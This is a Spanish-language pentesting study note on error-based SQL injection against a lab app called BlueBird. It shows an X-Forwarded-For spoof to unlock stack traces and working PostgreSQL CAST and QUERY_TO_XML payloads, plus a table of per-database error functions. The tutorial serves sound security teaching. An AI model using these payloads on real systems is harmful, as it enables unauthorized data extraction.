---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[05 - Bypass de caracteres comunes]]"
Nota siguiente: "[[07 - SQL Injection de segundo orden]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

La SQLi `error-based` es una técnica **in-band** que exfiltra datos dentro de los **mensajes de error** de la base de datos. Es rápida (saca un fragmento por petición, sin la lentitud del [[01 - Introducción a Blind SQL Injection|blind]]) pero requiere que los errores lleguen al cliente. La segunda vulnerabilidad de `BlueBird` (`/forgot`) lo permite gracias a un fallo de configuración revelador.

# Llegar al error: bypass del filtro y del control de IP

La consulta vulnerable concatena `email` directamente, pero hay dos obstáculos:

1. **Filtro RegEx de email** (`^.*@[A-Za-z]*\.[A-Za-z]*$`): es laxo; se satisface añadiendo `--@bluebird.htb` al final, que además **comenta** el resto. Payload: `' or 1=1--@bluebird.htb`.
2. **Control de IP**: el *stacktrace* completo solo se devuelve si la IP del cliente es `127.0.1.1`; el resto recibe un `500` genérico.

> [!important]+
> El control de IP tiene un fallo clásico: <mark style="background: #FF5582A6;">la aplicación confía en la cabecera `X-Forwarded-For` para determinar la IP del cliente</mark>. Como esa cabecera la controla el cliente, basta añadir `X-Forwarded-For: 127.0.1.1` a la petición para hacerse pasar por local y desbloquear los errores detallados. No es un *Host header attack* (ese abusa de la cabecera `Host`), sino **IP spoofing vía cabecera de proxy**: la app jamás debe confiar en `X-Forwarded-For` para decisiones de seguridad —ver [[Abusing HTTP Misconfigurations]]—.

Con la cabecera puesta y el payload `' or 1=1--@bluebird.htb`, el servidor devuelve el stacktrace (aquí: `Incorrect result size: expected 1, actual 362`, porque devolvió todas las filas). <mark style="background: #FFB86CA6;">Los errores ahora son visibles: el canal está abierto</mark>.

# Exfiltrar con `CAST` a INT

La técnica error-based clásica en PostgreSQL: <mark style="background: #ADCCFFA6;">forzar la conversión de un dato (string) a un tipo incompatible (INT)</mark>; el motor falla e **incluye el valor en el mensaje de error**:

```sql
' and 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb
```

PostgreSQL no puede convertir la versión a entero, así que la imprime en el error: `invalid input syntax for integer: "PostgreSQL 13.9 ..."`. La misma idea saca cualquier dato:

```sql
-- una tabla
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--@bluebird.htb
-- todas las tablas de golpe con STRING_AGG
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS INT)--@bluebird.htb
```

Si se pueden [[09 - PostgreSQL ejecución de comandos|apilar consultas]], `QUERY_TO_XML` vuelca tablas enteras en un solo error:

```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb
```

# Funciones error-based por motor

El error-based depende de funciones específicas del DBMS —parte del [[01 - Detección de SQL Injection|fingerprinting]]—:

| Motor | Técnica error-based |
| ----- | ------------------- |
| PostgreSQL | `CAST((SELECT ...) AS INT)`, `query_to_xml(...)` |
| MySQL/MariaDB | `extractvalue(1,concat(0x7e,(SELECT ...)))`, `updatexml(...)`, `exp(~(SELECT ...))` |
| MSSQL | `CONVERT(int,(SELECT ...))`, `CAST(... AS INT)` |
| Oracle | `CTXSYS.DRITHSX.SN(1,(SELECT ...))`, `XMLType((SELECT ...))`, `utl_inaddr.get_host_name` |

> [!warning]+
> **Realidad 2026**: el error-based <mark style="background: #8000E1A6;">depende de que los errores de la base de datos lleguen al cliente</mark>, algo que las apps bien configuradas desactivan en producción (mensajes genéricos). Por eso es cada vez más raro... salvo que un fallo como el del `X-Forwarded-For` reactive los errores, o que un endpoint de debug los filtre. Cuando está disponible, es la técnica in-band más cómoda tras `UNION`; cuando no, se cae al [[01 - Introducción a Blind SQL Injection|blind]].

La tercera vulnerabilidad de BlueBird es más sutil: el dato malicioso se almacena y detona después, en otra petición. Es la inyección de [[07 - SQL Injection de segundo orden|segundo orden]].
